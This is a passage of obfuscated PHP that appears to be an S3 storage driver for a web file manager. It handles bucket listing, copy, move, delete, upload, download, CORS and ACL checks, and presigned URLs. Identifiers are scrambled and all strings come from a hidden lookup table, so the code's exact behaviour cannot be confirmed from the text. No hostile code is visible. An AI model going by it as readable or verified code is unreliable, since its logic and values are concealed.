$¬œ†î„ = array_merge($¬œ†î„[$­·åÓ¼—[85]], $¬œ†î„[$­·åÓ¼—[86]]); $»¶€æ¶‘ = array_to_keyvalue($¬œ†î„, $­·åÓ¼—[12], $­·åÓ¼—[32]); $úò´Æš = $­·åÓ¼—[10] . get_path_ext($„ÑÖı’Š); $úò´Æš = $úò´Æš == $­·åÓ¼—[10] || $‚½¿ïú† ? $­·åÓ¼—[12] : $úò´Æš; $§ˆ°İÆ = substr($„ÑÖı’Š, 0, strlen($„ÑÖı’Š) - strlen($úò´Æš)); $“±³ÕÀ¢ = $§ˆ°İÆ . "\50\60\51{$úò´Æš}"; for ($„ÍÑ¹Û = 1; $„ÍÑ¹Û <= count($»¶€æ¶‘) + 1; $„ÍÑ¹Û++) { $“±³ÕÀ¢ = $§ˆ°İÆ . "\x28{$„ÍÑ¹Û}\x29{$úò´Æš}"; if (!in_array_not_case($“±³ÕÀ¢, $»¶€æ¶‘)) { return $“±³ÕÀ¢; } } return $“±³ÕÀ¢; } public function listAllFiles($ÚÖ´Ö°Í, $¾çŒçòµ) { $×Œ®»Ç‚ =& $_SERVER[ÓïÕü]; if (empty($¾çŒçòµ)) { return array(); } $ç”˜ú = array_keys($¾çŒçòµ); $ªˆ«ë÷í = array(); $ÚÖ´Ö°Í = trim($ÚÖ´Ö°Í, $×Œ®»Ç‚[8]); foreach ($¾çŒçòµ as $½ìÀ·ğ‚ => $‚çÎí±Î) { $·¦“Í = ltrim(substr(trim($½ìÀ·ğ‚, $×Œ®»Ç‚[8]), strlen($ÚÖ´Ö°Í)), $×Œ®»Ç‚[8]); if (substr($½ìÀ·ğ‚, -1) == $×Œ®»Ç‚[8]) { $·¦“Í = rtrim($·¦“Í, $×Œ®»Ç‚[8]) . $×Œ®»Ç‚[8]; } $ªˆ«ë÷í = array_merge($ªˆ«ë÷í, $this->slicePath($·¦“Í)); } $ÓÏ¹ù¦ = array(); foreach (array_unique($ªˆ«ë÷í) as $îİÇ´‰ç) { $Ç€˜±®Á = array($×Œ®»Ç‚[87] => $this->getPathOuter($×Œ®»Ç‚[8] . $ÚÖ´Ö°Í . $×Œ®»Ç‚[8] . $îİÇ´‰ç), $×Œ®»Ç‚[78] => 1, $×Œ®»Ç‚[79] => 0); if (substr($îİÇ´‰ç, -1) != $×Œ®»Ç‚[8]) { $Ç€˜±®Á[$×Œ®»Ç‚[78]] = 0; $Ø¬Ÿ§´› = $this->getPath($ÚÖ´Ö°Í . $×Œ®»Ç‚[8] . $îİÇ´‰ç); if (isset($¾çŒçòµ[$Ø¬Ÿ§´›])) { $œ¶ùË‹ô = $¾çŒçòµ[$Ø¬Ÿ§´›]; if (isset($œ¶ùË‹ô[$×Œ®»Ç‚[79]])) { $Ç€˜±®Á[$×Œ®»Ç‚[79]] = intval($œ¶ùË‹ô[$×Œ®»Ç‚[79]]); } if (isset($œ¶ùË‹ô[$×Œ®»Ç‚[207]])) { $Ç€˜±®Á[$×Œ®»Ç‚[88]] = intval($œ¶ùË‹ô[$×Œ®»Ç‚[207]]); } } } $ÓÏ¹ù¦[] = $Ç€˜±®Á; } return $ÓÏ¹ù¦; } public function slicePath($¦¦Îë†…) { $ÁÒ†ÕÉ =& $_SERVER[ÓïÕü]; $Ÿñ‰µ¦õ = explode($ÁÒ†ÕÉ[8], trim($¦¦Îë†…, $ÁÒ†ÕÉ[8])); $üô‚¥¢À = 0; do { ++$üô‚¥¢À; $…®ç¶ô‘[] = implode($ÁÒ†ÕÉ[8], array_slice($Ÿñ‰µ¦õ, 0, $üô‚¥¢À)) . $ÁÒ†ÕÉ[8]; } while ($üô‚¥¢À < count($Ÿñ‰µ¦õ)); $…®ç¶ô‘[count($Ÿñ‰µ¦õ) - 1] = $¦¦Îë†…; return $…®ç¶ô‘; } public function getHost() { $Ç¥Åş ¯ =& $_SERVER[ÓïÕü]; $ŸòìŞÅ• = parse_url(trim($this->domain, $Ç¥Åş ¯[8])); $ÕÔÓş®ã = isset($ŸòìŞÅ•[$Ç¥Åş ¯[208]]) ? $ŸòìŞÅ•[$Ç¥Åş ¯[208]] : http_type(); $Ê²¼¡ = isset($ŸòìŞÅ•[$Ç¥Åş ¯[209]]) ? $ŸòìŞÅ•[$Ç¥Åş ¯[209]] : $ŸòìŞÅ•[$Ç¥Åş ¯[87]]; if (isset($ŸòìŞÅ•[$Ç¥Åş ¯[210]])) { $Ê²¼¡ .= $Ç¥Åş ¯[4] . $ŸòìŞÅ•[$Ç¥Åş ¯[210]]; } return $ÕÔÓş®ã . $Ç¥Åş ¯[211] . $Ê²¼¡; } public function pathEncode($øÇóàçµ) { $øàµ®Ö =& $_SERVER[ÓïÕü]; return str_replace($øàµ®Ö[212], $øàµ®Ö[8], rawurlencode($øÇóàçµ)); } public function writeLog($ºËò‹ = '', $ƒıù…ÄÜ = false) { $éúŒ¼ˆá =& $_SERVER[ÓïÕü]; $ºäë¼Ö = in_array(ACTION, array($éúŒ¼ˆá[213], $éúŒ¼ˆá[214])); if (!$ºäë¼Ö && !GLOBAL_DEBUG) { return; } $ìŞŠ¾¡’ = $ºËò‹; static $¯Ô«›÷ = null; if (!$¯Ô«›÷) { $¯Ô«›÷ = strtoupper($this->getType()); } $ºËò‹ = $¯Ô«›÷ . $éúŒ¼ˆá[215] . $ºËò‹; if ($ƒıù…ÄÜ) { $¢ßÄÆä = error_get_last(); if ($¢ßÄÆä) { $ºËò‹ = array($ºËò‹, $¢ßÄÆä); } } write_log($ºËò‹, $éúŒ¼ˆá[216]); if ($ºäë¼Ö) { throw new Exception($ìŞŠ¾¡’); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ËœÑƒ¬) { set_timeout(); require_once SDK_DIR . $_SERVER[ÓïÕü][217]; parent::__construct(); $this->_init($ËœÑƒ¬); } public function _init($´•Òüµ¢) { $Ãà’—È =& $_SERVER[ÓïÕü]; $this->config = $´•Òüµ¢; foreach ($´•Òüµ¢ as $Ñ¶²Û => $Â“‚õ¬õ) { if (isset($this->{$Ñ¶²Û})) { $this->{$Ñ¶²Û} = $Â“‚õ¬õ; } } $this->endpoint = $´•Òüµ¢[$Ãà’—È[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Õğù¨é„ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Õğù¨é„, 0, 7) == $Ãà’—È[219]) { $Õğù¨é„ = $Ãà’—È[220] . substr($Õğù¨é„, 7); } $this->client->setEndpoint($Õğù¨é„); if (in_array(ACTION, array($Ãà’—È[213], $Ãà’—È[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ğ“ö»á = "\166\64") { $this->signVer = $ğ“ö»á; $this->client->setSignVersion($ğ“ö»á); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $“Äš†°) { return null; } } public function isBucketCors() { $õÆšÜ¿¯ =& $_SERVER[ÓïÕü]; $Ê´Ïé©Ï = $this->getBucketCors(); if (!$Ê´Ïé©Ï || !is_array($Ê´Ïé©Ï)) { return !1; } if (!is_array($Ê´Ïé©Ï[$õÆšÜ¿¯[221]])) { $Ê´Ïé©Ï[$õÆšÜ¿¯[221]] = explode($õÆšÜ¿¯[50], $Ê´Ïé©Ï[$õÆšÜ¿¯[221]]); } if ($Ê´Ïé©Ï[$õÆšÜ¿¯[222]] != $õÆšÜ¿¯[223] || !in_array($õÆšÜ¿¯[223], $Ê´Ïé©Ï[$õÆšÜ¿¯[221]])) { return !1; } $Ì½…¦œò = array_map($õÆšÜ¿¯[224], $Ê´Ïé©Ï[$õÆšÜ¿¯[225]]); if (!is_array($Ì½…¦œò)) { $Ì½…¦œò = array(); } $†”ãŠ¹ı = array($õÆšÜ¿¯[226], $õÆšÜ¿¯[227], $õÆšÜ¿¯[228], $õÆšÜ¿¯[229], $õÆšÜ¿¯[230]); $õ¥ßÁ‘ù = array_diff($†”ãŠ¹ı, $Ì½…¦œò); return empty($õ¥ßÁ‘ù); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ÛËœ¬†, $Û·Ëáî¹ = '', $ƒ¡´Ï“’ = REPEAT_RENAME) { $Ìåô Ä = $this->setContent($ÛËœ¬†, $Û·Ëáî¹); if ($Ìåô Ä !== !1) { return $this->getPathOuter($ÛËœ¬†); } return !1; } public function mkdir($Í¤ğ¤·Í, $İòıé¦¯ = REPEAT_SKIP) { $Õ«ÕÑå† =& $_SERVER[ÓïÕü]; if (empty($Í¤ğ¤·Í) && $Í¤ğ¤·Í !== $Õ«ÕÑå†[231]) { return !1; } if ($İòıé¦¯ && $this->_isFolder($Í¤ğ¤·Í)) { return $this->getPathOuter($Í¤ğ¤·Í); } $å†”æŒ… = $this->setContent($Í¤ğ¤·Í, $Õ«ÕÑå†[12], !0); if ($å†”æŒ… !== !1) { return $this->getPathOuter($Í¤ğ¤·Í); } return !1; } public function copyFile($”×«Ã³, $úâò¢µÈ, $áèúŠÁù = array()) { $«Ï¼ğÏ… =& $_SERVER[ÓïÕü]; $Ñ¿®ÓÒ— = $this->objectMeta($”×«Ã³); if (!$Ñ¿®ÓÒ—) { return !1; } if ($Ñ¿®ÓÒ—[$«Ï¼ğÏ…[79]] <= 1024 * 1024 * 200) { $Ú–®óæê = $this->client->copyObject($this->bucket, $”×«Ã³, $this->bucket, $úâò¢µÈ, $«Ï¼ğÏ…[232], $áèúŠÁù); } else { $Ú–®óæê = $this->client->multiCopyObject($this->bucket, $”×«Ã³, $this->bucket, $úâò¢µÈ, $áèúŠÁù); } $Ú–®óæê = $Ú–®óæê ? $this->getPathOuter($úâò¢µÈ) : !1; return $Ú–®óæê; } public function moveFile($ü½¦Ö ‚, $ïâÉ—ß¾) { if ($this->copyFile($ü½¦Ö ‚, $ïâÉ—ß¾)) { $this->delFile($ü½¦Ö ‚); return $this->getPathOuter($ïâÉ—ß¾); } return !1; } public function delFile($ß«Ê¨äğ) { return $this->client->deleteObject($this->bucket, $ß«Ê¨äğ); } public function delFolder($²öëÏîæ) { $…£‹•Ûı =& $_SERVER[ÓïÕü]; if (!$this->exist($²öëÏîæ)) { return !0; } $this->listItemCache = !1; $ü€íİ¢å = $this->fileList($²öëÏîæ); $this->listItemCache = !0; $Îˆİ…—î = trim($²öëÏîæ, $…£‹•Ûı[8]) . $…£‹•Ûı[8]; if (!empty($²öëÏîæ) && $²öëÏîæ !== $…£‹•Ûı[231] && !in_array($Îˆİ…—î, $ü€íİ¢å[$…£‹•Ûı[85]])) { $ü€íİ¢å[$…£‹•Ûı[85]][] = $Îˆİ…—î; } $İæâê† = $this->delByBatch($ü€íİ¢å[$…£‹•Ûı[86]]); if (!$İæâê†) { return !1; } $İæâê† = $this->delByBatch($ü€íİ¢å[$…£‹•Ûı[85]]); if (!$İæâê†) { return !1; } return $this->delFile($Îˆİ…—î); } private function delByBatch($ãäºëß) { foreach (array_chunk($ãäºëß, 1000) as $èßÑÀÃÅ) { $âú­ƒÊ = $this->client->deleteObjects($this->bucket, $èßÑÀÃÅ); if (!$âú­ƒÊ) { return !1; } } return !0; } public function rename($±®ï‹, $±¹›´õ) { return $this->renameObject($±®ï‹, $±¹›´õ); } public function listPath($ÊûÌç–Ä, $€îÛ çö = false) { $Ûˆƒ‹Ëƒ =& $_SERVER[ÓïÕü]; $ ŞûÄÙ¼ = $this->fileList($ÊûÌç–Ä, $Ûˆƒ‹Ëƒ[8], !0); foreach ($ ŞûÄÙ¼[$Ûˆƒ‹Ëƒ[85]] as $ÂğÚ™Ş => $Î„â’ÁÉ) { $ ŞûÄÙ¼[$Ûˆƒ‹Ëƒ[85]][$ÂğÚ™Ş] = $this->folderInfo($Î„â’ÁÉ, $€îÛ çö, $Î„â’ÁÉ); } foreach ($ ŞûÄÙ¼[$Ûˆƒ‹Ëƒ[86]] as $ÂğÚ™Ş => $Î„â’ÁÉ) { $ ŞûÄÙ¼[$Ûˆƒ‹Ëƒ[86]][$ÂğÚ™Ş] = $this->fileInfo($Î„â’ÁÉ[$Ûˆƒ‹Ëƒ[32]], $€îÛ çö, $Î„â’ÁÉ); } return $ ŞûÄÙ¼; } protected function infoChildren($éÖÊ¿½œ, &$¼’ˆ€ØÄ) { $‘»úøä =& $_SERVER[ÓïÕü]; $’äêÇ‹† = $this->fileList($éÖÊ¿½œ, $‘»úøä[12], !0); $¼’ˆ€ØÄ[$‘»úøä[81]] += count($’äêÇ‹†[$‘»úøä[85]]); $¼’ˆ€ØÄ[$‘»úøä[80]] += count($’äêÇ‹†[$‘»úøä[86]]); foreach ($’äêÇ‹†[$‘»úøä[86]] as $Ş®©×Ì´) { if (!$Ş®©×Ì´ || !$Ş®©×Ì´[$‘»úøä[79]]) { continue; } $¼’ˆ€ØÄ[$‘»úøä[79]] += $Ş®©×Ì´[$‘»úøä[79]]; } } private function fileInfo($ïäì®ø, $—ŠÏß›¹ = false, $‡‹‹¼¯± = array()) { $ŒüŸ¤»’ =& $_SERVER[ÓïÕü]; $Ú®ÃÏ…ò = array($ŒüŸ¤»’[32] => $this->pathThis($ïäì®ø), $ŒüŸ¤»’[87] => $this->getPathOuter($ïäì®ø), $ŒüŸ¤»’[33] => $ŒüŸ¤»’[233], $ŒüŸ¤»’[169] => $this->ext($ïäì®ø), $ŒüŸ¤»’[79] => isset($‡‹‹¼¯±[$ŒüŸ¤»’[79]]) ? $‡‹‹¼¯±[$ŒüŸ¤»’[79]] : 0); if ($—ŠÏß›¹) { return $Ú®ÃÏ…ò; } $Ú®ÃÏ…ò[$ŒüŸ¤»’[234]] = $Ú®ÃÏ…ò[$ŒüŸ¤»’[88]] = 0; $Ú®ÃÏ…ò[$ŒüŸ¤»’[235]] = $Ú®ÃÏ…ò[$ŒüŸ¤»’[236]] = !0; if (empty($‡‹‹¼¯±)) { $‡‹‹¼¯± = $this->objectMeta($ïäì®ø); if (!$‡‹‹¼¯±) { return $Ú®ÃÏ…ò; } } if (isset($‡‹‹¼¯±[$ŒüŸ¤»’[237]]) && $‡‹‹¼¯±[$ŒüŸ¤»’[237]]) { $Ú®ÃÏ…ò[$ŒüŸ¤»’[238]] = $‡‹‹¼¯±[$ŒüŸ¤»’[237]]; } if (isset($‡‹‹¼¯±[$ŒüŸ¤»’[207]])) { $Ú®ÃÏ…ò[$ŒüŸ¤»’[88]] = $‡‹‹¼¯±[$ŒüŸ¤»’[207]]; } if (isset($‡‹‹¼¯±[$ŒüŸ¤»’[79]])) { $Ú®ÃÏ…ò[$ŒüŸ¤»’[79]] = $‡‹‹¼¯±[$ŒüŸ¤»’[79]]; } return $Ú®ÃÏ…ò; } private function folderInfo($‘ı§¨ï, $™¸úÙ½õ = false, $¤©ğÅÀè = array()) { $·•³±Ô =& $_SERVER[ÓïÕü]; $í—ûŞ”Ê = array($·•³±Ô[32] => $this->pathThis($‘ı§¨ï), $·•³±Ô[87] => $this->getPathOuter($·•³±Ô[8] . $‘ı§¨ï), $·•³±Ô[33] => $·•³±Ô[78]); if ($™¸úÙ½õ) { return $í—ûŞ”Ê; } $í—ûŞ”Ê[$·•³±Ô[234]] = $í—ûŞ”Ê[$·•³±Ô[88]] = 0; $í—ûŞ”Ê[$·•³±Ô[235]] = $í—ûŞ”Ê[$·•³±Ô[236]] = !0; if ($‘ı§¨ï == $·•³±Ô[12]) { return $í—ûŞ”Ê; } if (empty($¤©ğÅÀè)) { $¤©ğÅÀè = $this->objectMeta(trim($‘ı§¨ï, $·•³±Ô[8]) . $·•³±Ô[8]); } if (isset($¤©ğÅÀè[$·•³±Ô[207]])) { $í—ûŞ”Ê[$·•³±Ô[234]] = $¤©ğÅÀè[$·•³±Ô[207]]; } return $í—ûŞ”Ê; } private function fileList($ŞÎˆÙ´«, $™Éë‰Ò³ = '', $Ç¬é õ = 0) { $˜…‚È‡² =& $_SERVER[ÓïÕü]; $¯³ÚÛãÉ = rtrim($ŞÎˆÙ´«, $˜…‚È‡²[8]) . $˜…‚È‡²[8]; $ø»¶ğ• = $this->listObjs($¯³ÚÛãÉ, null, null, $™Éë‰Ò³); if (!$ø»¶ğ•) { return array($˜…‚È‡²[85] => array(), $˜…‚È‡²[86] => array()); } $•œêŠ˜› = $¬§¯‚—Ú = array(); foreach ($ø»¶ğ•[$˜…‚È‡²[239]] as $¼¼ÀÅ¯ì) { $İíÚ§÷† = $¼¼ÀÅ¯ì[$˜…‚È‡²[32]]; if ($İíÚ§÷† == $¯³ÚÛãÉ) { continue; } $­›×‡ÔÌ = isset($¼¼ÀÅ¯ì[$˜…‚È‡²[79]]) ? $¼¼ÀÅ¯ì[$˜…‚È‡²[79]] : 0; $–£ÜŠåÂ = $­›×‡ÔÌ == 0 && substr($İíÚ§÷†, strlen($İíÚ§÷†) - 1, 1) == $˜…‚È‡²[8] ? !0 : !1; $this->cacheMethodInfoSet($İíÚ§÷†, $–£ÜŠåÂ, $¼¼ÀÅ¯ì); if ($–£ÜŠåÂ) { $•œêŠ˜›[] = $İíÚ§÷†; continue; } $¬§¯‚—Ú[] = $Ç¬é õ ? $¼¼ÀÅ¯ì : $İíÚ§÷†; } foreach ($ø»¶ğ•[$˜…‚È‡²[240]] as $¼¼ÀÅ¯ì) { $•œêŠ˜›[] = $¼¼ÀÅ¯ì[$˜…‚È‡²[32]]; $this->cacheMethodInfoSet($¼¼ÀÅ¯ì[$˜…‚È‡²[32]], !0); } $this->cacheMethodInfoSet($ŞÎˆÙ´«, !0); return array($˜…‚È‡²[85] => $•œêŠ˜›, $˜…‚È‡²[86] => $¬§¯‚—Ú); } private function listObjs($¢Í²‚²Õ, $¾—Ã½âü = null, $†ĞŞÖÍÊ = null, $§¼ÇœŠå = null) { $‹•·¬£Ò =& $_SERVER[ÓïÕü]; $¢Í²‚²Õ = trim($¢Í²‚²Õ, $‹•·¬£Ò[8]); $¬«¶Â˜Ó = empty($¢Í²‚²Õ) && $¢Í²‚²Õ !== $‹•·¬£Ò[231] ? $‹•·¬£Ò[12] : $¢Í²‚²Õ . $‹•·¬£Ò[8]; return $this->client->getBucket($this->bucket, $¬«¶Â˜Ó, $¾—Ã½âü, $†ĞŞÖÍÊ, $§¼ÇœŠå, !0); } public function has($×Æ˜½—œ, $ûœ¥¥ÒÊ = false, $€‹²Ğô = true) { $ÄºÄÚ™ï =& $_SERVER[ÓïÕü]; $×Æ˜½—œ = trim($×Æ˜½—œ, $ÄºÄÚ™ï[8]); $ÎÛÈ‡Á = empty($×Æ˜½—œ) && $×Æ˜½—œ !== $ÄºÄÚ™ï[231] ? $ÄºÄÚ™ï[12] : $×Æ˜½—œ . $ÄºÄÚ™ï[8]; $“²Î­ëÚ = null; $ƒ€º¾Ùš = 500; $ëÃ¼ªô = $ÄºÄÚ™ï[8]; $ñÅø÷‚¾ = $üÌ¯·×Æ = array(); while (!0) { $€„½‡Æ = $this->listObjs($×Æ˜½—œ, $“²Î­ëÚ, $ƒ€º¾Ùš, $ëÃ¼ªô); if (!$€„½‡Æ) { break; } $“²Î­ëÚ = $€„½‡Æ[$ÄºÄÚ™ï[241]]; $š°ü”Õô = $€„½‡Æ[$ÄºÄÚ™ï[239]]; $ÚûÃíÕ = $€„½‡Æ[$ÄºÄÚ™ï[240]]; if (empty($š°ü”Õô) && empty($ÚûÃíÕ)) { break; } if (count($š°ü”Õô) == 1 && $š°ü”Õô[0][$ÄºÄÚ™ï[32]] == $ÎÛÈ‡Á) { break; } if ($ûœ¥¥ÒÊ) { if (count($š°ü”Õô)) { $š°ü”Õô = array_column($š°ü”Õô, $ÄºÄÚ™ï[32]); $ñÅø÷‚¾ = array_merge($ñÅø÷‚¾, $š°ü”Õô); } if (count($ÚûÃíÕ)) { $ÚûÃíÕ = array_column($ÚûÃíÕ, $ÄºÄÚ™ï[32]); $üÌ¯·×Æ = array_merge($üÌ¯·×Æ, $ÚûÃíÕ); } if ($“²Î­ëÚ === null) { break; } continue; } if ($€‹²Ğô) { if (!empty($š°ü”Õô)) { if (count($š°ü”Õô) > 1 || isset($š°ü”Õô[0][$ÄºÄÚ™ï[32]]) && $š°ü”Õô[0][$ÄºÄÚ™ï[32]] != $ÎÛÈ‡Á) { return !0; } } } else { if (!empty($ÚûÃíÕ)) { return !0; } } if ($“²Î­ëÚ === null) { break; } } if ($ûœ¥¥ÒÊ) { $ñÅø÷‚¾ = array_diff($ñÅø÷‚¾, array($ÎÛÈ‡Á)); $ñÅø÷‚¾ = count(array_unique($ñÅø÷‚¾)); $üÌ¯·×Æ = count(array_unique($üÌ¯·×Æ)); return array($ÄºÄÚ™ï[242] => $ñÅø÷‚¾, $ÄºÄÚ™ï[243] => $üÌ¯·×Æ); } return !1; } public function listAll($ëÌ¾ÄÕß) { $¥ûÇ¦øÒ =& $_SERVER[ÓïÕü]; $è€âÎŞ = $this->fileList($ëÌ¾ÄÕß, $¥ûÇ¦øÒ[12], !0); $•‚„ÄË = array_to_keyvalue($è€âÎŞ[$¥ûÇ¦øÒ[86]], $¥ûÇ¦øÒ[32]); foreach ($è€âÎŞ[$¥ûÇ¦øÒ[85]] as $Û®Í¿½†) { if (is_string($Û®Í¿½†)) { $•‚„ÄË[$Û®Í¿½†] = array($¥ûÇ¦øÒ[79] => 0); } } return $this->listAllFiles($ëÌ¾ÄÕß, $•‚„ÄË); } public function canRead($®µ™ßŸ») { $¸£Ñı˜† =& $_SERVER[ÓïÕü]; $ÙÛôş¥Œ = $this->client->getAccessControlPolicy($this->bucket, $®µ™ßŸ»); if (!$ÙÛôş¥Œ) { return !1; } return in_array($ÙÛôş¥Œ, array($¸£Ñı˜†[244], $¸£Ñı˜†[245], $¸£Ñı˜†[246])) ? !0 : !1; } public function canWrite($ÆÌËëÃÀ) { $ğöÚğø =& $_SERVER[ÓïÕü]; $ª¡£ˆÃí = $this->client->getAccessControlPolicy($this->bucket, $ÆÌËëÃÀ); if (!$ª¡£ˆÃí) { return !1; } return in_array($ª¡£ˆÃí, array($ğöÚğø[244], $ğöÚğø[245])) ? !0 : !1; } public function getContent($•¢ö°Ï‡) { return $this->client->getObject($this->bucket, $•¢ö°Ï‡); } public function setContent($¬Ã’¸Ã, $™€Ÿ”¿£ = '', $°ÕÂ×‚˜ = false) { $¦æì÷Š =& $_SERVER[ÓïÕü]; $¬Ã’¸Ã = $°ÕÂ×‚˜ ? trim($¬Ã’¸Ã, $¦æì÷Š[8]) . $¦æì÷Š[8] : $¬Ã’¸Ã; $Âê²Ï = get_file_mime(get_path_ext($¬Ã’¸Ã)); $¬Ş´£¡à = $this->client->putObject($™€Ÿ”¿£, $this->bucket, $¬Ã’¸Ã, $¦æì÷Š[232], array(), $Âê²Ï); if (!$¬Ş´£¡à) { return !1; } if ($°ÕÂ×‚˜) { return !0; } return $¬Ş´£¡à ? !0 : !1; } public function fileSubstr($–À¥ÀË, $Í†íôá’, $ÂÖÊ­˜) { $š¨‹‚ËÕ = $Í†íôá’ + $ÂÖÊ­˜ - 1; return $this->client->getObject($this->bucket, $–À¥ÀË, array($_SERVER[ÓïÕü][247] => "\x62\171\x74\145\163\x3d{$Í†íôá’}\x2d{$š¨‹‚ËÕ}")); } public function upload($±ğ¹ä³À, $Ã¸ƒ†„Û, $ÕÅàñÌ¸ = false, $•ı…İñì = REPEAT_REPLACE) { $î‰‘Ø³ =& $_SERVER[ÓïÕü]; $Âäü³Š˜ = array($î‰‘Ø³[248] => @md5_file($Ã¸ƒ†„Û)); $¢ıƒ‰õô = array($î‰‘Ø³[249] => get_file_mime(get_path_ext($±ğ¹ä³À))); if (IO::size($Ã¸ƒ†„Û) <= 1024 * 1024 * 200) { $ í¸ÜÄø = $this->client->putObjectFile($Ã¸ƒ†„Û, $this->bucket, $±ğ¹ä³À, $î‰‘Ø³[232], $Âäü³Š˜, $¢ıƒ‰õô); return !empty($ í¸ÜÄø) ? $this->getPathOuter($±ğ¹ä³À) : !1; } $¿‘±²œÙ = $this->client->multiUploadObject($Ã¸ƒ†„Û, $this->bucket, trim($±ğ¹ä³À, $î‰‘Ø³[8]), $Âäü³Š˜, $¢ıƒ‰õô); return $¿‘±²œÙ ? $this->getPathOuter($±ğ¹ä³À) : !1; } public function download($óÃüşşØ, $Œ¨°£ó) { if (!@is_dir($this->pathFather($Œ¨°£ó)) && !IO::mkdir($this->pathFather($Œ¨°£ó))) { return !1; } $¢ößŞà© = $this->client->getObject($this->bucket, $óÃüşşØ, array(), $Œ¨°£ó); return $¢ößŞà© !== !1 ? $Œ¨°£ó : !1; } public function link($Òê‹Ã¨è, $ò¥Â“Æ„ = array()) { return $this->getPreSignedURL($Òê‹Ã¨è, 3600 * 12, $ò¥Â“Æ„); } private function getPreSignedURL($÷ìË®‡é, $¹·ú›ù, $ÄŞÖ¼› = array(), $‘İ¼¹ì = "\x47\105\x54") { $‹÷«ğèÂ =& $_SERVER[ÓïÕü]; $÷ìË®‡é = trim($÷ìË®‡é, $‹÷«ğèÂ[8]); if ($this->signVer == $‹÷«ğèÂ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $÷ìË®‡é, $¹·ú›ù, $‘İ¼¹ì, $ÄŞÖ¼›); } return $this->client->getPreSignedV4URL($this->bucket, $÷ìË®‡é, $¹·ú›ù, array(), $‘İ¼¹ì, $ÄŞÖ¼›); } public function fileOut($è’‡…è», $Œ¶€¿õ— = false, $¹”Û¢š“ = false, $÷Õ‡ù¹Ÿ = '') { $˜¶°ø·ˆ =& $_SERVER[ÓïÕü]; if ($this->isFileOutServer()) { return $this->fileOutServer($è’‡…è», $Œ¶€¿õ—, $¹”Û¢š“, $÷Õ‡ù¹Ÿ); } if (!$¹”Û¢š“) { $¹”Û¢š“ = $this->pathThis($è’‡…è»); } $Õ°œ§‚Í = get_file_mime(get_path_ext($¹”Û¢š“)); if ($Õ°œ§‚Í == $˜¶°ø·ˆ[251]) { return parent::fileOut($è’‡…è», $Œ¶€¿õ—, $¹”Û¢š“, $÷Õ‡ù¹Ÿ); } $®ÙÍãùı = array($˜¶°ø·ˆ[252] => $Õ°œ§‚Í); if ($Œ¶€¿õ—) { $®ÙÍãùı[$˜¶°ø·ˆ[253]] = $˜¶°ø·ˆ[254] . rawurlencode($¹”Û¢š“); } else { } $”¥¾…øŠ = $this->link($è’‡…è», $®ÙÍãùı); $this->fileOutLink($”¥¾…øŠ); } public function fileOutServer($¨¿„Ô£¡, $¨²¢á“È = false, $ÊÍİ”Ø = false, $„àŞ„è¢ = '') { parent::fileOut($¨¿„Ô£¡, $¨²¢á“È, $ÊÍİ”Ø, $„àŞ„è¢); } public function fileOutImageServer($¤êüÖ×é, $Ä¸›ä£æ = 250) { parent::fileOutImage($¤êüÖ×é, $Ä¸›ä£æ); } public function hashMd5($ø¥İÆÄ, $üÄ‡òĞ© = '') { $ºœ­òªø = $this->objectMeta($ø¥İÆÄ); if (!$ºœ­òªø) { return !1; } $üÄ‡òĞ© = $üÄ‡òĞ© ? $üÄ‡òĞ© : _get($ºœ­òªø, $_SERVER[ÓïÕü][255]); return $üÄ‡òĞ©; } public function uploadFormData($‚À©ä²×, $¶¡ÈÉÌ = 3600) { $¡Ù¿İé¯ =& $_SERVER[ÓïÕü]; if (!$this->_isClientAsync()) { $§İ¶’€ = $this->getPreSignedURL($‚À©ä²×, $¶¡ÈÉÌ, array(), $¡Ù¿İé¯[256]); return array($¡Ù¿İé¯[209] => str_replace($¡Ù¿İé¯[219], $¡Ù¿İé¯[257], $§İ¶’€)); } if (isset($GLOBALS[$¡Ù¿İé¯[6]][$¡Ù¿İé¯[92]][$¡Ù¿İé¯[258]]) && $GLOBALS[$¡Ù¿İé¯[6]][$¡Ù¿İé¯[92]][$¡Ù¿İé¯[258]] == $¡Ù¿İé¯[231]) { return $this->uploadMultiData($‚À©ä²×, $¶¡ÈÉÌ); } if ($this->signVer == $¡Ù¿İé¯[250]) { return $this->uploadFormDataV2($‚À©ä²×, $¶¡ÈÉÌ); } return $this->uploadFormDataV4($‚À©ä²×, $¶¡ÈÉÌ); } public function uploadFormDataV2($î˜Øˆ¹, $†…‡İª± = 3600) { $ŸÕğÅ¬ =& $_SERVER[ÓïÕü]; $—ßâŠ¨» = $this->pathFather($î˜Øˆ¹); $ëÀšä©Æ = $this->client->getHttpUploadPostParams($this->bucket, $—ßâŠ¨», $ŸÕğÅ¬[232], $†…‡İª±); $¢êş’ = array_merge((array) $ëÀšä©Æ, array($ŸÕğÅ¬[259] => $ŸÕğÅ¬[250], $ŸÕğÅ¬[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($¢êş’[$ŸÕğÅ¬[259]]); } return $¢êş’; } public function uploadFormDataV4($±‰Äêµ¬, $Û’ùÁª = 3600) { $üãİ¿†â =& $_SERVER[ÓïÕü]; $êÒü¨Øş = $üãİ¿†â[232]; $áôŠæ¾è = $üãİ¿†â[260]; $ë°–›Æ‡ = $üãİ¿†â[62]; $â¶¸¨Ûé = gmdate($üãİ¿†â[261]); $ßıİíÌş = gmdate($üãİ¿†â[262]); $ãÚ³§º = $üãİ¿†â[263]; $‡û¢ÉÁş = $Û’ùÁª . $üãİ¿†â[12]; $î´¡á’é = $üãİ¿†â[264]; $ÄÉ……á´ = array($this->accessKey, $ßıİíÌş, $this->region, $ë°–›Æ‡, $ãÚ³§º); $¬‰çòá = implode($üãİ¿†â[8], $ÄÉ……á´); $ò‚³ü•‹ = array($üãİ¿†â[265] => gmdate($üãİ¿†â[266], strtotime($üãİ¿†â[267])), $üãİ¿†â[268] => array(array($üãİ¿†â[269] => $this->bucket), 